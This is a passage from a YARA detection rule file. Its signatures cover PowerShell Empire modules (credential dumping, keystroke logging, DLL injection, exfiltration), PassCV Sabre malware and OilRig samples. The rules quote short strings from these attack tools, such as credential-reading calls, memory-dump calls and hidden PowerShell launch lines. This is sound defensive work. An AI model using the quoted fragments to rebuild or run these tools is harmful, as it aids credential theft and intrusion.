\"9a705f30766279d1e91273cfb1ce7156699177a109908e9a986cc2d38a7ab1dd\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$up = Test-Connection -count 1 -Quiet -ComputerName $Computer \" fullword ascii\n      $s2 = \"$out | add-member Noteproperty 'Password' $Password\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 10KB and 1 of them ) or all of them\n}\n\nrule Empire_Exploit_JBoss_RID2EF7 : DEMO EXPLOIT SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file Exploit-JBoss.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 11:37:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9ea3e00b299e644551d90bbee0ce3e4e82445aa15dab7adb7fcc0b7f1fe4e653\"\n      tags = \"DEMO, EXPLOIT, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Exploit-JBoss\" fullword ascii\n      $s2 = \"$URL = \\\"http$($SSL)://\\\" + $($Rhost) + ':' + $($Port)\" ascii\n      $s3 = \"\\\"/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service\" ascii\n      $s4 = \"http://blog.rvrsh3ll.net\" fullword ascii\n      $s5 = \"Remote URL to your own WARFile to deploy.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 10KB and 1 of them ) or all of them\n}\n\nrule Empire_dumpCredStore_RID2F13 : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file dumpCredStore.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 11:41:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c1e91a5f9cc23f3626326dab2dcdf4904e6f8a332e2bce8b9a0854b371c2b350\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[DllImport(\\\"Advapi32.dll\\\", SetLastError = true, EntryPoint = \\\"CredReadW\\\"\" ascii\n      $s12 = \"[String] $Msg = \\\"Failed to enumerate credentials store for user '$Env:UserName'\\\"\" fullword ascii\n      $s15 = \"Rtn = CredRead(\\\"Target\\\", CRED_TYPE.GENERIC, out Cred);\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x233c and filesize < 40KB and 1 of them ) or all of them\n}\n\nrule Empire_Invoke_EgressCheck_RID30E4 : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file Invoke-EgressCheck.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:59:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e2d270266abe03cfdac66e6fc0598c715e48d6d335adf09a9ed2626445636534\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"egress -ip $ip -port $c -delay $delay -protocol $protocol\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x233c and filesize < 10KB and 1 of them ) or all of them\n}\n\nrule Empire_ReflectivePick_x64_orig_RID32B3 : DEMO EXE FILE SCRIPT T1059 {\n   meta:\n      description = \"Detects Empire component - file ReflectivePick_x64_orig.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 14:16:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"a8c1b108a67e7fc09f81bd160c3bafb526caf3dbbaf008efb9a96f4151756ff2\"\n      tags = \"DEMO, EXE, FILE, SCRIPT, T1059\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"\\\\PowerShellRunner.pdb\" ascii\n      $a2 = \"PowerShellRunner.dll\" fullword wide\n      $s1 = \"ReflectivePick\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of ( $a* ) and $s1\n}\n\nrule Empire_Out_Minidump_RID2EAC : DEMO SCRIPT T1003_001 T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file Out-Minidump.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 11:24:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7803ae7ba5d4e7d38e73745b3f321c2ca714f3141699d984322fa92e0ff037a1\"\n      tags = \"DEMO, SCRIPT, T1003_001, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\" fullword ascii\n      $s2 = \"$ProcessFileName = \\\"$($ProcessName)_$($ProcessId).dmp\\\"\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 10KB and 1 of them ) or all of them\n}\n\nrule Empire_Invoke_PsExec_RID2EE5 : DEMO SCRIPT T1059 T1059_001 T1569_002 {\n   meta:\n      description = \"Detects Empire component - file Invoke-PsExec.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 11:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0218be4323959fc6379489a6a5e030bb9f1de672326e5e5b8844ab5cedfdcf88\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001, T1569_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Invoke-PsExecCmd\" fullword ascii\n      $s2 = \"\\\"[*] Executing service .EXE\" fullword ascii\n      $s3 = \"$cmd = \\\"%COMSPEC% /C echo $Command ^> %systemroot%\\\\Temp\\\\\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 50KB and 1 of them ) or all of them\n}\n\nrule Empire_Invoke_PostExfil_RID303B : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file Invoke-PostExfil.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:31:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"00c0479f83c3dbbeff42f4ab9b71ca5fe8cd5061cb37b7b6861c73c54fd96d3e\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"# upload to a specified exfil URI\" fullword ascii\n      $s2 = \"Server path to exfil to.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x490a and filesize < 2KB and 1 of them ) or all of them\n}\n\nrule Empire_Invoke_SMBAutoBrute_RID311A : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file Invoke-SMBAutoBrute.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 13:08:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7950f8abdd8ee09ed168137ef5380047d9d767a7172316070acc33b662f812b2\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[*] PDC: LAB-2008-DC1.lab.com\" fullword ascii\n      $s2 = \"$attempts = Get-UserBadPwdCount $userid $dcs\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them\n}\n\nrule Empire_Get_Keystrokes_RID2F85 : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file Get-Keystrokes.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:00:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c36e71db39f6852f78df1fa3f67e8c8a188bf951e96500911e9907ee895bf8ad\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them\n}\n\nrule Empire_Invoke_DllInjection_RID315C : DEMO SCRIPT T1055_001 T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file Invoke-DllInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 13:19:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"304031aa9eca5a83bdf1f654285d86df79cb3bba4aa8fe1eb680bd5b2878ebf0\"\n      tags = \"DEMO, SCRIPT, T1055_001, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-Dll evil.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 40KB and 1 of them ) or all of them\n}\n\nrule Empire_KeePassConfig_RID2ED4 : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file KeePassConfig.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 11:31:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5a76e642357792bb4270114d7cd76ce45ba24b0d741f5c6b916aeebd45cff2b3\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$UserMasterKeyFiles = @(, $(Get-ChildItem -Path $UserMasterKeyFolder -Force | Select-Object -ExpandProperty FullName) )\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7223 and filesize < 80KB and 1 of them ) or all of them\n}\n\nrule Empire_Invoke_SSHCommand_RID304A : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file Invoke-SSHCommand.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:33:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cbaf086b14d5bb6a756cbda42943d4d7ef97f8277164ce1f7dd0a1843e9aa242\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$Base64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA\" ascii\n      $s2 = \"Invoke-SSHCommand -ip 192.168.1.100 -Username root -Password test -Command \\\"id\\\"\" fullword ascii\n      $s3 = \"Write-Verbose \\\"[*] Error loading dll\\\"\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x660a and filesize < 2000KB and 1 of them ) or all of them\n}\n\nrule Empire_PowerUp_Gen_RID2E1D : DEMO GEN SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - from files PowerUp.ps1, PowerUp.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 11:00:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ad9a5dff257828ba5f15331d59dd4def3989537b3b6375495d0c08394460268c\"\n      tags = \"DEMO, GEN, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$Result = sc.exe config $($TargetService.Name) binPath= $OriginalPath\" fullword ascii\n      $s2 = \"$Result = sc.exe pause $($TargetService.Name)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x233c and filesize < 2000KB and 1 of them ) or all of them\n}\n\nrule Empire_Agent_Gen_RID2D3A : DEMO GEN SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - from files agent.ps1, agent.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 10:22:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"380fd09bfbe47d5c8c870c1c97ff6f44982b699b55b61e7c803d3423eb4768db\"\n      tags = \"DEMO, GEN, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$wc.Headers.Add(\\\"User-Agent\\\",$script:UserAgent)\" fullword ascii\n      $s2 = \"$min = [int]((1-$script:AgentJitter)*$script:AgentDelay)\" fullword ascii\n      $s3 = \"if ($script:AgentDelay -ne 0){\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x660a and filesize < 100KB and 1 of them ) or all of them\n}\n\nrule Empire_Invoke_InveighRelay_Gen_RID32DD : DEMO GEN SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - from files Invoke-InveighRelay.ps1, Invoke-InveighRelay.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 14:23:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash2 = \"21b90762150f804485219ad36fa509aeda210d46453307a9761c816040312f41\"\n      tags = \"DEMO, GEN, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$inveigh.SMBRelay_failed_list.Add(\\\"$HTTP_NTLM_domain_string\\\\$HTTP_NTLM_user_string $SMBRelayTarget\\\")\" fullword ascii\n      $s2 = \"$NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 200KB and 1 of them ) or all of them\n}\n\nrule Empire_KeePassConfig_Gen_RID304D : DEMO GEN SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - from files KeePassConfig.ps1, KeePassConfig.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash2 = \"5a76e642357792bb4270114d7cd76ce45ba24b0d741f5c6b916aeebd45cff2b3\"\n      tags = \"DEMO, GEN, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7223 and filesize < 80KB and 1 of them ) or all of them\n}\n\nrule Empire_Invoke_Portscan_Gen_RID3160 : DEMO GEN SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - from files Invoke-Portscan.ps1, Invoke-Portscan.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 13:19:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash2 = \"cf7030be01fab47e79e4afc9e0d4857479b06a5f68654717f3bc1bc67a0f38d3\"\n      tags = \"DEMO, GEN, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Test-Port -h $h -p $Port -timeout $Timeout\" fullword ascii\n      $s2 = \"1 {$nHosts=10;  $Threads = 32;   $Timeout = 5000 }\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 100KB and 1 of them ) or all of them\n}\n\nrule Empire_Invoke_Gen_RID2DB7 : DEMO GEN SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - from files Invoke-DCSync.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 10:43:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a3428a7d4f9e677623fadff61b2a37d93461123535755ab0f296aa3b0396eb28\"\n      hash2 = \"61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4\"\n      hash3 = \"eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5\"\n      tags = \"DEMO, GEN, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$Shellcode1 += 0x48\" fullword ascii\n      $s2 = \"$PEHandle = [IntPtr]::Zero\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 3000KB and 1 of them ) or all of them\n}\n\nrule Empire_PowerShell_Framework_Gen5_RID3392 : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 14:53:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8\"\n      hash2 = \"61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4\"\n      hash3 = \"eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if ($ExeArgs -ne $null -and $ExeArgs -ne '')\" fullword ascii\n      $s2 = \"$ExeArgs = \\\"ReflectiveExe $ExeArgs\\\"\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 1000KB and 1 of them ) or all of them\n}\n\nrule PassCV_Sabre_Malware_1_RID2F45 : APT DEMO EXE FILE {\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20 11:50:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"24a9bfbff81615a42e42755711c8d04f359f3bf815fb338022edca860ff1908a\"\n      hash2 = \"e61e56b8f2666b9e605127b4fcc7dc23871c1ae25aa0a4ea23b48c9de35d5f55\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"F:\\\\Excalibur\\\\Excalibur\\\\Excalibur\\\\\" ascii\n      $x2 = \"bin\\\\oSaberSvc.pdb\" ascii\n      $s1 = \"cmd.exe /c MD \" fullword ascii\n      $s2 = \"https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=0&rsv_idx=1&tn=baidu&wd=ip138\" fullword wide\n      $s3 = \"CloudRun.exe\" fullword wide\n      $s4 = \"SaberSvcB.exe\" fullword wide\n      $s5 = \"SaberSvc.exe\" fullword wide\n      $s6 = \"SaberSvcW.exe\" fullword wide\n      $s7 = \"tianshiyed@iaomaomark1#23mark123tokenmarkqwebjiuga664115\" fullword wide\n      $s8 = \"Internet Connect Failed!\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) and 5 of ( $s* ) ) ) or ( all of them )\n}\n\nrule PassCV_Sabre_Malware_Signing_Cert_RID33D0 : APT DEMO EXE FILE {\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20 15:03:51\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7c32885c258a6d5be37ebe83643f00165da3ebf963471503909781540204752e\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WOODTALE TECHNOLOGY INC\" ascii\n      $s2 = \"Flyingbird Technology Limited\" ascii\n      $s3 = \"Neoact Co., Ltd.\" ascii\n      $s4 = \"AmazGame Age Internet Technology Co., Ltd\" ascii\n      $s5 = \"EMG Technology Limited\" ascii\n      $s6 = \"Zemi Interactive Co., Ltd\" ascii\n      $s7 = \"337 Technology Limited\" ascii\n      $s8 = \"Runewaker Entertainment0\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them )\n}\n\nrule PassCV_Sabre_Malware_Excalibur_1_RID3343 : APT DEMO EXE {\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20 14:40:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"21566f5ff7d46cc9256dae8bc7e4c57f2b9261f95f6ad2ac921558582ea50dfb\"\n      hash2 = \"02922c5d994e81629d650be2a00507ec5ca221a501fe3827b5ed03b4d9f4fb70\"\n      tags = \"APT, DEMO, EXE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"F:\\\\Excalibur\\\\Excalibur\\\\\" ascii\n      $x2 = \"Excalibur\\\\bin\\\\Shell.pdb\" ascii\n      $x3 = \"SaberSvc.exe\" wide\n      $s1 = \"BBB.exe\" fullword wide\n      $s2 = \"AAA.exe\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of ( $x* ) or all of ( $s* ) ) or 3 of them\n}\n\nrule PassCV_Sabre_Malware_3_RID2F47 : APT DEMO EXE FILE {\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20 11:50:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"28c7575b2368a9b58d0d1bf22257c4811bd3c212bd606afc7e65904041c29ce1\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"NXKILL\" fullword wide\n      $s1 = \"2OLE32.DLL\" fullword ascii\n      $s2 = \"localspn.dll\" fullword wide\n      $s3 = \"!This is a Win32 program.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and $x1 and 2 of ( $s* ) )\n}\n\nrule PassCV_Sabre_Malware_4_RID2F48 : APT DEMO EXE FILE {\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20 11:50:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"27463bcb4301f0fdd95bc10bf67f9049e161a4e51425dac87949387c54c9167f\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"QWNjZXB0On\" fullword ascii\n      $s2 = \"VXNlci1BZ2VudDogT\" fullword ascii\n      $s3 = \"dGFzay5kbnME3luLmN\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}\n\nrule PassCV_Sabre_Tool_NTScan_RID3010 : APT DEMO EXE FILE T1021_002 {\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20 12:23:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0f290612b26349a551a148304a0bd3b0d0651e9563425d7c362f30bd492d8665\"\n      tags = \"APT, DEMO, EXE, FILE, T1021_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"NTscan.EXE\" fullword wide\n      $x2 = \"NTscan Microsoft \" fullword wide\n      $s1 = \"admin$\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them )\n}\n\nrule PassCV_Sabre_Malware_5_RID2F49 : APT DEMO EXE FILE {\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20 11:50:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"03aafc5f468a84f7dd7d7d38f91ff17ef1ca044e5f5e8bbdfe589f5509b46ae5\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ncircTMPg\" fullword ascii\n      $x2 = \"~SHELL#\" fullword ascii\n      $x3 = \"N.adobe.xm\" fullword ascii\n      $s1 = \"NEL32.DLL\" fullword ascii\n      $s2 = \"BitLocker.exe\" fullword wide\n      $s3 = \"|xtplhd\" fullword ascii\n      $s4 = \"SERVICECORE\" fullword wide\n      $s5 = \"SHARECONTROL\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 1 of ( $x* ) or all of ( $s* ) )\n}\n\nrule OilRig_Malware_Campaign_Gen1_RID31A8 : DEMO FILE G0049 MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects Oilrig malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/\"\n      date = \"2016-10-12 13:31:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"d808f3109822c185f1d8e1bf7ef7781c219dc56f5906478651748f0ace489d34\"\n      hash2 = \"80161dad1603b9a7c4a92a07b5c8bce214cf7a3df897b561732f9df7920ecb3e\"\n      hash3 = \"662c53e69b66d62a4822e666031fd441bbdfa741e20d4511c6741ec3cb02475f\"\n      tags = \"DEMO, FILE, G0049, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Get-Content $env:Public\\\\Libraries\\\\update.vbs) -replace\" ascii\n      $x2 = \"wss.Run \\\"powershell.exe \\\" & Chr(34) & \\\"& {waitfor haha /T 2}\\\" & Chr(34), 0\" fullword ascii\n      $x3 = \"Call Extract(UpdateVbs, wss.ExpandEnvironmentStrings(\\\"%PUBLIC%\\\") & \\\"\\\\Libraries\\\\update.vbs\\\")\" fullword ascii\n      $s4 = \"CreateObject(\\\"WScript.Shell\\\").Run cmd, 0o\" fullword ascii\n      $b1 = \"JGdsb2JhbDpteWhvc3QgP\" ascii\n      $b2 = \"SE9NRT0iJXB1YmxpYyVcTGlicmFyaWVzX\" ascii\n      $b3 = \"U2V0IHdzcyA9IENyZWF0ZU9iamVjdCgid1NjcmlwdC5TaGV\" ascii\n      $b4 = \"JHNjcmlwdGRpciA9IFNwbGl0LVBhdGggLVBhcmVudCAtUGF0aCA\" ascii\n      $b5 = \"DQpTZXQgd3NzID0gQ3JlYXRlT2JqZWN\" ascii\n      $b6 = \"d2hvYW1pICYgaG9zdG5hb\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 700KB and 1 of them )\n}\n\nrule OilRig_Malware_Campaign_Mal1_RID31A8 : DEMO FILE G0049 MAL MIDDLE_EAST T1105 {\n   meta:\n      description = \"Detects Oilrig malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/\"\n      date = \"2016-10-12 13:31:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      